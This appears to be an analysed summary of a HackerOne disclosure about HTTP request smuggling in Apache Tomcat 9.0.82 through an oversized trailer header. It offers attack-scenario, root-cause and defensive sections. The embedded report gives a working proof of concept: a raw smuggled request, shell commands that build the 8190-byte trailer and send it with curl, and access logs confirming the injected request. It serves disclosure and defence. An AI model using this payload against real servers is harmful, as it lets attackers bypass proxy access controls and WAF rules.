# HTTP Request Smuggling via Oversized Trailer Header in Apache Tomcat

## Metadata
- **Source:** HackerOne
- **Report:** 2280391 | https://hackerone.com/reports/2280391
- **Submitted:** 2023-12-11
- **Reporter:** aimotonorihito
- **Program:** Apache Tomcat
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** HTTP Request Smuggling, Header Size Limit Bypass, CL.TE (Content-Length Transfer-Encoding) Desynchronization, Improper Input Validation
- **CVEs:** None
- **Category:** uncategorised

## Summary
Apache Tomcat 9.0.82 contains an HTTP request smuggling vulnerability where oversized trailer headers in chunked transfer encoding requests trigger an IOException that allows the parser to desynchronize with the HTTP client. This permits an attacker to inject arbitrary HTTP requests that are interpreted as separate requests, bypassing security controls when Tomcat operates behind a reverse proxy.

## Attack scenario
1. Attacker sends a chunked POST request with a valid body followed by a trailer header section
2. The trailer header is crafted to exceed the configured size limit (8190 bytes in the example), triggering an IOException during header parsing
3. Due to error handling logic, the parser incorrectly treats the incomplete trailer parsing state as request completion
4. Subsequent data in the connection (injected HTTP request) is interpreted as a new request rather than continuation of the first request
5. When behind a reverse proxy, the proxy and Tomcat have different interpretations of request boundaries
6. The injected request reaches the backend application, bypassing proxy-level security controls and WAF rules

## Root cause
Tomcat's HTTP/1.1 parser fails to properly handle exceptions during trailer header size validation in chunked transfer encoding. When a trailer header exceeds the size limit, an IOException is thrown but the connection state is not properly maintained, causing the parser to treat the next data on the persistent connection as a new request rather than rejecting or buffering the malformed request.

## Attacker mindset
An attacker seeks to exploit HTTP desynchronization to smuggle malicious requests past reverse proxies and security appliances. By crafting requests that are parsed differently by frontend and backend servers, they can bypass authentication, access controls, and WAF rules. The attacker intentionally triggers error conditions to manipulate parser behavior and achieves request injection through subtle violations of HTTP protocol handling.

## Defensive takeaways
- Implement strict and consistent trailer header size validation across all HTTP protocol implementations
- Ensure exception handling during header parsing preserves secure connection state and doesn't allow request boundary confusion
- Use connection termination rather than silent error recovery when protocol violations occur with trailer headers
- Implement request smuggling detection through request parsing consistency validation
- Upgrade to patched Tomcat versions and enable strict HTTP/1.1 compliance validation
- Deploy HTTP request normalization and smuggling detection at the reverse proxy/WAF level
- Avoid using persistent connections (KeepAlive) with untrusted clients when HTTP/1.1 smuggling is a concern
- Monitor and log all IOException events during header parsing for security anomaly detection

## Variant hunting
Hunt for similar parser state confusion vulnerabilities in: (1) other trailer header implementations in Java HTTP servers (Jetty, Undertow, JBoss), (2) header size limit validation in other frameworks (Go, Rust, Python servers), (3) exception handling paths in chunked transfer encoding decoders, (4) persistent connection state management after parsing errors, (5) other Content-Length/Transfer-Encoding interaction scenarios that could cause desynchronization

## MITRE ATT&CK
- T1190
- T1021
- T1071.001
- T1565.002
- T1589.004

## Notes
The vulnerability requires specific conditions: (1) Tomcat behind a reverse proxy with different header size limits or parsing behavior, (2) persistent HTTP/1.1 connections enabled, (3) clients capable of sending crafted chunked requests with oversized trailers. The PoC demonstrates reproducibility with a 8190-byte trailer construction. This is a classic HTTP request smuggling scenario (CL.TE variant) where the frontend and backend disagree on request boundaries due to error handling differences. The fix likely involves proper connection closure or request rejection rather than silent error recovery.

## Full report
<details><summary>Expand</summary>

Request smuggling was possible by throwing an IOException with the upper size limit of the trailer header.
Confirmed with tomcat version 9.0.82.

* example
~~~~~~~~~~~~~~~~~~
POST /examples/test.jsp HTTP/1.1
Host: www.example.co.jp
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
Connection: KeepAlive

5
foo=b
2
ar
0
testtrailer: aaaaa...(large size)
a: GET /examples/?this_is_attack HTTP/1.1
Host: attack

~~~~~~~~~~~~~~~~~~


* Reproduce with the following steps:
```
$ git clone https://github.com/oss-aimoto/tomcat-trailer.git
$ cd tomcat-trailer
$ docker-compose build
$ docker-compose up -d
$ echo -n "testtrailer: " > 8190_EXCLUDE_COLON_SP_CR_LF.txt
$ for i in `seq 8179`; do echo -n "a"; done >> 8190_EXCLUDE_COLON_SP_CR_LF.txt
$ perl -e 'print "\r\n"' >> 8190_EXCLUDE_COLON_SP_CR_LF.txt
$ head -11 base.txt > attack5.txt
$ cat 8190_EXCLUDE_COLON_SP_CR_LF.txt >> attack5.txt
$ perl -e 'print "a: GET /examples/?this_is_attack HTTP/1.1\r\nHost: attack\r\n\r\n"' >> attack5.txt
$ cat attack5.txt | curl telnet://localhost:8082/ --output -
```

The result of curl is two HTTP responses("/examples/test.jsp" and "/examples/?this_is_attack").
Two requests are recorded in the Tomcat access log.

```
192.168.128.1 - - [23/Oct/2023:06:55:37 +0000] "POST /examples/test.jsp HTTP/1.1" 200 58
192.168.128.1 - - [23/Oct/2023:06:55:37 +0000] "GET /examples/?this_is_attack HTTP/1.1" 200 1126 
```

## Impact

A trailer header that exceeded the header size limit could cause Tomcat to treat a single request as multiple requests leading to the possibility of request smuggling when behind a reverse proxy.

</details>

---
*Analysed by Claude on 2026-05-24*
